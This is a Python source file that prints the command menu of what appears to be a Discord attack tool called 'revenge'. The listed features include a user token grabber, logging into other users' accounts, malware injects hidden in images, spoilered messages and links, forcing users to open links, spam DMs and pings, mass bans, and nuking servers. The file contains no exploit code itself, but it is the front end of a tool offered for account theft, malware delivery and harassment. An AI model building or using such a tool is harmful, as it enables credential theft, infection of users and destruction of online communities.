# commandlist.py

from revenge_modules import textdivider

class CommandList:
	def CreateCommandList():
		firstRowOptions = [
			"\n		USER CONTROL",
			"		[-liu] Log into User",
			"		[-da] DM Annoyance (Spam DMs)",
			"		[-utg] User Token Grabber",
			"		[-fdd] Force Disable / Delete",
			"\n		MALWARE INJECTS",
			"		[-mii] Malware Inject for Images",
			"		[-mism] Malware Inject for Spoilered messages",
			"		[-misl] Malware Inject for Sent Links",
			"		[-umi] Target user for Malware Inject",
			"\n		EXTRA UTILITY",
			"		[-fmd] FMD (Force Server Mute and Defean)",
			"		[-fusm] Force User to send a message",
			"		[-fiol] Force User to open a link",
			"		[-gttu] Get Information from a targetted User"
		]

		secondRowOptions = [
			"\n		SERVER CONTROL",
			"		[-scc] Spam-Create Channel",
			"		[-scr] Spam-Create Roles",
			"		[-sp] Spam Ping",
			"		[-mku] Mass Kick Users",
			"		[-mbu] Mass Ban Users",
			"		[-ns] Nuke Server",
			"\n		MISCELLANEOUS",
			"		[-nts] Nuke a targetted server",
			"		[-rmrc] Wipe all roles and channels",
			"		[-csp] Change Server Properties",
			"		[-wm] Webhook Management",
			"		[-dcr] Delete all channels and roles",
			"		[-duvc] Disconnect User from a voice channel"
		]

		textdivider.TextDivider.CreateNewDivider("-", 120, True, False)
		for i in firstRowOptions:
			print(i)

		textdivider.TextDivider.CreateNewDivider("-", 120, True, False)
		for i in secondRowOptions:
			print(i)
